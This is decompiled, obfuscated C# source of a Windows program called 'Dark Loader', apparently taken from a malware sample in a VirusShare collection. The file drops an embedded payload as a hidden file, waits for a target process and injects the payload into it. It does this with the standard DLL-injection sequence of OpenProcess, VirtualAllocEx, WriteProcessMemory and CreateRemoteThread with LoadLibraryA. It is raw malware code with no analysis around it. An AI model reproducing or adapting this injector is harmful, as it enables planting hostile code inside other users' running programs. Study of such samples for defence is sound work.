// Decompiled with JetBrains decompiler
// Type: ᝆ
// Assembly: Dark Loader, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DFEE064A-49C9-4F8A-9570-A84DA8B26A81
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00009-msil\Virus.Win32.Nimnul.a-86af889e7f9100c44a79aa48c8abb4d540c74b8c37496695f400159d1f3edc48.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[DesignerGenerated]
public class ᝆ : Form
{
  private IContainer ឩ;
  private TextBox ឪ;
  private Timer ឫ;
  private Timer ឬ;
  private object ឭ;
  private int ឮ;
  private int ឯ;
  private string ឰ;
  private int ឱ;
  public const int \u177E = 16;
  public const int \u175A = 2;
  public const int ᝈ = 4096;
  public const int ᝊ = 4;
  public const int \u1758 = 2;
  public const int ᝎ = 8;
  public const int \u1752 = 32;
  private string ឲ;
  private string \u17F5;

  public ᝆ()
  {
    this.Load += new EventHandler(this.ឦ);
    this.ឭ = (object) (Application.StartupPath + ᙵ.ᝢ);
    this.\u17F5 = Path.GetFileNameWithoutExtension(Application.ExecutablePath);
    this.ឤ();
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.ឩ == null)
        return;
      this.ឩ.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void ឤ()
  {
    this.ឩ = (IContainer) new System.ComponentModel.Container();
    this.ᙦ = new TextBox();
    this.\u1759 = new Timer(this.ឩ);
    this.ᝢ = new Timer(this.ឩ);
    this.SuspendLayout();
    this.ᙦ.Location = new Point(12, 12);
    this.ᙦ.Name = ᙵ.ᝤ;
    this.ᙦ.ReadOnly = true;
    TextBox ᙦ = this.ᙦ;
    Size size1 = new Size(167, 20);
    Size size2 = size1;
    ᙦ.Size = size2;
    this.ᙦ.TabIndex = 0;
    this.ᙦ.Text = ᙵ.ᝦ;
    this.ᙦ.TextAlign = HorizontalAlignment.Center;
    this.\u1759.Enabled = true;
    this.\u1759.Interval = 50;
    this.ᝢ.Interval = 300;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    size1 = new Size(191, 43);
    this.ClientSize = size1;
    this.Controls.Add((Control) this.ᙦ);
    this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
    this.Name = ᙵ.ᝨ;
    this.ShowIcon = false;
    this.ShowInTaskbar = false;
    this.Text = ᙵ.ᝪ;
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  internal virtual TextBox ᙦ
  {
    get => this.ឪ;
    [MethodImpl(MethodImplOptions.Synchronized)] set => this.ឪ = value;
  }

  internal virtual Timer \u1759
  {
    get => this.ឫ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.ឧ);
      if (this.ឫ != null)
        this.ឫ.Tick -= eventHandler;
      this.ឫ = value;
      if (this.ឫ == null)
        return;
      this.ឫ.Tick += eventHandler;
    }
  }

  internal virtual Timer ᝢ
  {
    get => this.ឬ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.ឨ);
      if (this.ឬ != null)
        this.ឬ.Tick -= eventHandler;
      this.ឬ = value;
      if (this.ឬ == null)
        return;
      this.ឬ.Tick += eventHandler;
    }
  }

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int ReadProcessMemory(
    int hProcess,
    int lpBaseAddress,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpBuffer,
    int nSize,
    ref int lpNumberOfBytesWritten);

  [DllImport("kernel32", EntryPoint = "LoadLibraryA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int LoadLibrary([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpLibFileName);

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int VirtualAllocEx(
    int hProcess,
    int lpAddress,
    int dwSize,
    int flAllocationType,
    int flProtect);

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int WriteProcessMemory(
    int hProcess,
    int lpBaseAddress,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpBuffer,
    int nSize,
    ref int lpNumberOfBytesWritten);

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int GetProcAddress(int hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpProcName);

  [DllImport("Kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetModuleHandle([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpModuleName);

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int CreateRemoteThread(
    int hProcess,
    int lpThreadAttributes,
    int dwStackSize,
    int lpStartAddress,
    int lpParameter,
    int dwCreationFlags,
    ref int lpThreadId);

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int OpenProcess(int dwDesiredAccess, int bInheritHandle, int dwProcessId);

  [DllImport("user32", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

  [DllImport("kernel32", EntryPoint = "CloseHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int CloseHandle(int hObject);

  private void ឥ()
  {
    int num1;
    int lErl;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 2;
      this.\u1759.Stop();
      this.ᝢ.Stop();
      this.ឮ = ᝆ.OpenProcess(42, 0, Process.GetProcessesByName(ᙵ.ᝬ)[0].Id);
      this.ឰ = Conversions.ToString(this.ឭ);
      string ᝮ = ᙵ.ᝮ;
      int moduleHandle = ᝆ.GetModuleHandle(ref ᝮ);
      string ᝰ = ᙵ.ᝰ;
      ref string local1 = ref ᝰ;
      this.ឯ = ᝆ.GetProcAddress(moduleHandle, ref local1);
      this.ឱ = checked (1 + Strings.Len(this.ឰ));
      int num3 = ᝆ.VirtualAllocEx(this.ឮ, 0, this.ឱ, 4096, 4);
      int ឮ1 = this.ឮ;
      int lpBaseAddress = num3;
      ref string local2 = ref this.ឰ;
      int ឱ = this.ឱ;
      int num4 = 0;
      ref int local3 = ref num4;
      ᝆ.WriteProcessMemory(ឮ1, lpBaseAddress, ref local2, ឱ, ref local3);
      int ឮ2 = this.ឮ;
      int ឯ = this.ឯ;
      int lpParameter = num3;
      int num5 = 0;
      ref int local4 = ref num5;
      ᝆ.CreateRemoteThread(ឮ2, 0, 0, ឯ, lpParameter, 0, ref local4);
      ᝆ.CloseHandle(this.ឮ);
label_1:
      lErl = 1;
      this.Show();
      goto label_7;
label_2:
      num2 = -1;
      switch (num1)
      {
        case 2:
          goto label_1;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex, lErl);
      goto label_2;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_7:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void ឦ(object ᙂ, EventArgs ᙄ)
  {
    if (File.Exists(Conversions.ToString(this.ឭ)))
      File.Delete(Conversions.ToString(this.ឭ));
    ᝮ.Computer.FileSystem.WriteAllBytes(Conversions.ToString(this.ឭ), ន.ឡ, true);
    FileSystem.SetAttr(Conversions.ToString(this.ឭ), FileAttribute.Hidden);
    this.\u1759.Start();
  }

  private void ឧ(object ᙂ, EventArgs ᙄ)
  {
    if (!File.Exists(Conversions.ToString(this.ឭ)))
      return;
    if (Process.GetProcessesByName(ᙵ.\u1772).Length == 0)
    {
      this.ᙦ.ForeColor = Color.YellowGreen;
      this.ᙦ.Text = ᙵ.គ;
    }
    else
    {
      this.ឥ();
      this.ᙦ.Text = ᙵ.ង;
      this.ᝢ.Start();
      this.\u1759.Stop();
    }
  }

  private void ឨ(object ᙂ, EventArgs ᙄ) => Application.Exit();
}
